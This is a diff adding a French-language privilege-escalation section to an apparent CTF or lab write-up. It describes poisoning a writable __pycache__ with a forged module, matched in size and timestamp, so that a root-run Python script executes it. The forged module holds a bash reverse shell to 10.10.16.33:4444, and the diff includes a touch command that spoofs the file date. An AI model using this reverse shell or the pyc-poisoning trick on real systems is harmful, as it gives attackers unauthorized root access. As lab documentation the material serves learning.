@@ -94,5 +94,39 @@ Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
 
 ![[IMG-20260115004512846.png]]
 
+## Privesc:
+
+![[IMG-20260115132148521.png]]
+On peut exécuter un script python en root qui télécharge des module dans extension_utils.py
+On observer aussi que le dossier __pycache__ est writable. 
+`__pycache__` est un répertoire utilisé par Python pour stocker les fichiers **bytecode compilés** (`.pyc`).  
+Lorsqu’un module Python est importé, Python le compile en bytecode afin d’accélérer les imports suivants, puis enregistre ce bytecode dans `__pycache__`.
+
+Lors d’un import ultérieur, **si un fichier `.pyc` valide est présent**, Python peut l’exécuter directement **sans relire le fichier source `.py`**, à condition que ses métadonnées internes (timestamp et taille du fichier source) correspondent.
+Voici les metadonné du fichiers extension_utils.py:
+![[IMG-20260115133043277.png]]
+Il faut donc créer une copie du fichier avec un poc à l'interieur en faisant attention que sa taille et sa date soit la meme que le vrai extension_utils:
+Voici le code de la copie:
+```
+import os
+os.system("bash -c 'bash -i >& /dev/tcp/10.10.16.33/4444 0>&1'")
+
+#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+On utilise cette commande pour changer la date:
+```
+touch -d "2025-03-23 10:56:19" extension_utils.py
+```
+
+![[IMG-20260115133418694.png]]
+
+Notre copie à maintenant la même date et la même taille que le vrai extension_utils.py
+On compile ensuite notre fichier et on le copie dans `__pycache__`
+![[IMG-20260115133643808.png]]
+On execute le script en root et on obtient un shell root sur notre machine.
+![[IMG-20260115133726301.png]]
+
+![[IMG-20260115133827978.png]]
 
 ![[IMG-20260115131054327.png]]
